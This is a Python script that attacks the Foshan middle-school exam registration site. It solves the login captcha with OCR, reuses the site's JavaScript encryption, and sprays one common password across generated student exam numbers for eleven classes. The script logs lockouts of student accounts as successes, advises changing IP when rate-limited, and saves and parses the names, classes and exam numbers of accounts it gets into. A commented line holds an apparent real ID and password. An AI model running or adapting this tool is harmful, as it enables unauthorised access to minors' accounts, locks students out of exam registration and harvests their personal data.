'''
Author: whalefall
Date: 2021-03-20 16:37:34
LastEditTime: 2021-03-28 10:50:58
Description: 中考报名网站
'''
import base64
import hashlib
import random
import re
# from Crypto.Cipher import AES # 没能力复写JS加密 弃用
import time
from io import BytesIO

# 验证码
import pytesseract
import requests
from lxml import etree
from PIL import Image
import execjs
import os
import datetime
from concurrent.futures import ThreadPoolExecutor
import threading
# 懒得研究/复写他的加密算法 直接用execjs模拟


class Encrypt:
    def __init__(self):

        # 加密的js文件

        with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "EncryptJS.js"), mode="r") as js:
            jsContent = js.read()

        self.ctx = execjs.compile(jsContent)

    def userid(self, userid):

        return self.ctx.call("encryptByDES", userid, "AGH123OL")

    def pwd(self, pwd):

        return self.ctx.call("hex_md5", pwd)


# 从这里开始

class Zkweb:

    # 初始化各种属性
    def __init__(self):
        self.header = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 MicroMessenger/6.7.3(0x16070321) NetType/WIFI Language/zh_CN",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            # Cookie: SESSION=a02ab646-9f8a-4755-9abb-f722d6fb1676; name=value; JSESSIONID=value,
            "Host": "exam.edu.foshan.gov.cn",
            "Pragma": "no-cache",
            "Referer": "https://exam.edu.foshan.gov.cn/iexamfs/",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        }
        self.sessions = requests.session() # 带cookies的请求

        self.code = None # 验证码内容   
        self.index_url = None
        self.count = 0 # 失败计数

    # 获取验证码地址
    def getCode(self):
        url = "https://exam.edu.foshan.gov.cn/iexamfs/KsLoginAction.action"
        try:
            resp = self.sessions.get(url, headers=self.header)
            # print(resp.text)
            html = etree.HTML(resp.text)
            code = html.xpath(
                "/html/body/form/table/tr/td[2]/table/tr[4]/td/table/tr/td/table/tr[3]/td[2]/img/@src")[0]
            code_url = "https://exam.edu.foshan.gov.cn/iexamfs/"+code
            # print("验证码地址:", code_url)
            return code_url
        except Exception as e:
            print("页面验证码获取失败")
            return None
        finally:
            resp.close()

    # 下载验证码 返回二进制信息
    def downloadCode(self):
        code_url = self.getCode()
        if code_url == None:
            pass
        else:
            try:
                # self.key = random.randint(0, 99999999)
                resp = self.sessions.get(code_url, headers=self.header)
                # with open(r"C:\Users\Administrator\Desktop\code\%s.jpg" % (self.key), mode="wb") as f:
                #     f.write(resp)
                # print("验证码已下载! KEY:%s" % (self.key))

                # 验证码内容
                self.code = resp.content

                return True
            except Exception as e:
                print("下载验证码失败! URL:%s" % (code_url))
                return False
            finally:
                resp.close()

    # 验证码识别部分

    def checkCode(self):
        if self.downloadCode():
            # 两种验证码图片处理方法

            # image = self.delete_spot()
            image = self.convert_Image()

            code = pytesseract.image_to_string(image)
            # 去掉非法字符，只保留字母数字
            textCode = re.sub("\W", "", code)
            # print("识别到的验证码:", textCode)

            # 验证码为空 重试
            if textCode == "":
                return False

            return textCode

        else:
            return False

    # 美化验证码1
    def convert_Image(self, standard=127.5):
        '''
        【灰度转换】
        '''

        img = Image.open(BytesIO(self.code))

        image = img.convert('L')

        '''
        【二值化】
        根据阈值 standard , 将所有像素都置为 0(黑色) 或 255(白色), 便于接下来的分割
        '''
        pixels = image.load()
        for x in range(image.width):
            for y in range(image.height):
                if pixels[x, y] > standard:
                    pixels[x, y] = 255
                else:
                    pixels[x, y] = 0

        # image.show()
        return image

    # 美化验证码2

    def delete_spot(self):

        def processing_image():

            # 2进制处理
            img = Image.open(BytesIO(self.code))

            img = img.convert("L")  # 转灰度
            pixdata = img.load()
            w, h = img.size
            threshold = 160  # 该阈值不适合所有验证码，具体阈值请根据验证码情况设置
            # 遍历所有像素，大于阈值的为黑色
            for y in range(h):
                for x in range(w):
                    if pixdata[x, y] < threshold:
                        pixdata[x, y] = 0
                    else:
                        pixdata[x, y] = 255
            return img

        images = processing_image()

        data = images.getdata()

        w, h = images.size
        black_point = 0
        for x in range(1, w - 1):
            for y in range(1, h - 1):
                mid_pixel = data[w * y + x]  # 中央像素点像素值
                if mid_pixel < 50:  # 找出上下左右四个方向像素点像素值
                    top_pixel = data[w * (y - 1) + x]
                    left_pixel = data[w * y + (x - 1)]
                    down_pixel = data[w * (y + 1) + x]
                    right_pixel = data[w * y + (x + 1)]
                # 判断上下左右的黑色像素点总个数
                    if top_pixel < 10:
                        black_point += 1
                    if left_pixel < 10:
                        black_point += 1
                    if down_pixel < 10:
                        black_point += 1
                    if right_pixel < 10:
                        black_point += 1
                    if black_point < 1:
                        images.putpixel((x, y), 255)
                        black_point = 0

        # images.show()
        return images

    # 登录部分 并获取主页
    def login(self, code, userid, pwd):

        url = "https://exam.edu.foshan.gov.cn/iexamfs/KsLoginSuccessAction.action"

        data = {
            "ksLoginUsername": "ksno",
            "userid": Encrypt().userid(userid),
            "login.logintype": "ks",
            "keyvalue": Encrypt().pwd(pwd),
            "rand": code,
        }

        # print(data)

        try:
            resp = self.sessions.post(url, data=data, headers=self.header)
        except:
            print("请求登录接口错误?")
            return "apiError"
        finally:
            resp.close()

        # 登录时的错误

        # print(resp.text)
        if "输入的验证码错误" in resp.text:
            print("验证码识别有误:%s" % (code))
            return False

        elif "[规则]登录失败！" in resp.text:

            print("登录受限!")
            self.count += 1
            if self.count >= 10:
                print("账户(%s)可能被限制超过10次 请换ip" % (userid))
                return "resqError"

            return False

        elif "登录失败，请核对您的用户名和密码！" in resp.text:
            print("账号密码有误!")
            return "PwdError"

        elif "账号已被锁定，请在5分钟后进行尝试。" in resp.text:
            print("[Suc]账号(%s)已被锁定!" % (userid))
            return "Locking"

        else:
            print("可能登录成功?")

            try:
                # 获取主页加密

                html = etree.HTML(resp.text)
                self.index_url = html.xpath("/html/body/div[4]/a[2]/@href")[0]
                print("主页链接:%s" % (self.index_url))
                return True

            except:
                print("获取主页链接失败", resp.text)
                with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "error//%s %s.html" % (userid, time.strftime("%H-%M-%S", time.localtime()))), mode="w", encoding="gb2312") as f:

                    f.write(resp.text)

                    print("错误主页%s已下载" % (userid))

                return "Error"

    # 保存并解析 主页
    def index(self):

        self.header["Referer"] = "https://exam.edu.foshan.gov.cn/iexamfs/KsLoginSuccessAction.action"

        index_url = "https://exam.edu.foshan.gov.cn/iexamfs/%s" % (
            self.index_url)

        resp = self.sessions.get(index_url, headers=self.header)

        # print(self.__indexRE(resp.text)[0])
        index_return = self.__indexRE(resp.text)
        if index_return[0]:
            # 下载
            with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "html//%s.html" % (index_return[1])), mode="w", encoding="utf8") as f:

                f.write(resp.text)

            print("主页:%s 下载成功!" % (index_return[1]))

        else:
            # print("")
            pass

    # 解析主页 内部方法

    def __indexRE(self, html):

        html = etree.HTML(html)

        try:
            st_name = html.xpath(
                "/html/body/div[1]/table[1]/tr[3]/td[4]")[0].text.strip()  # 姓名

            st_class = html.xpath(
                "/html/body/div[1]/table[1]/tr[5]/td[2]")[0].text.strip()  # 班级

            st_id = html.xpath(
                "/html/body/div[1]/table[1]/tr[3]/td[2]")[0].text.strip()  # 考号

            print("[Suc]HTML解析成功! 姓名:%(st_name)s 班级:%(st_class)s 考号:%(st_id)s" % vars())

            return (True, "%(st_name)s%(st_class)s%(st_id)s" % vars(),)
        except Exception as e:
            print("[Error]HTML解析失败!", e)
            return (False,)


# 主函数
def main(userid, pwd):
    # lock.acquire()

    bot = Zkweb()

    # userid = "21060515080713"
    # pwd = "@lovehyy123456"

    # for i in range(5):
    try:
        i = 0
        while True:
            i += 1
            print("----------------%s第%s次请求----------------" % (userid, i))
            code = bot.checkCode()

            loginStatus = bot.login(code, userid, pwd)

            if loginStatus == "Error":
                # print("发生未知错误 已下载错误页面!")

                break

            elif loginStatus == "Locking":
                print('''
################################
#    时间:%s
#    账号:%s 成功被锁定!
################################
                ''' % (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), userid))
                with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), "result.txt"), mode="a") as txt:
                    txt.write('''
################################
#    时间:%s
#    账号:%s 成功被锁定!
################################
                    ''' % (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), userid))

                break

            elif loginStatus == "apiError":
                print("接口错误!")
                # time.sleep(10)
                break

            elif loginStatus == "PwdError":
                # print("")
                continue

            elif loginStatus == "resqError":
                # print("")
                break

            elif loginStatus == "error":
                # print("")
                break

            elif loginStatus:
                bot.index()
                break

            else:
                pass
                # time.sleep(2)
    finally:
        # lock.release()
        pass


if __name__ == "__main__":

    # userid = "21060515080613"
    # pwd = "@lovehyy123456"
    # main(userid, pwd)

    # lock = threading.Lock()

    # 构造考号:2106051508|0613

    # import multiprocessing
    # pool = multiprocessing.Pool(processes=3)

    for classId in range(1, 12):
        for i in range(1, 52):

            if i == 13:
                continue

            # pool.apply_async(func=main, args=(
            #     "2106051508%02d%02d" % (classId, i), "@A123456",))
            main("2106051508%02d%02d" % (classId, i), "@A123456")

    # pool.close()
    # pool.join()

    print("main")
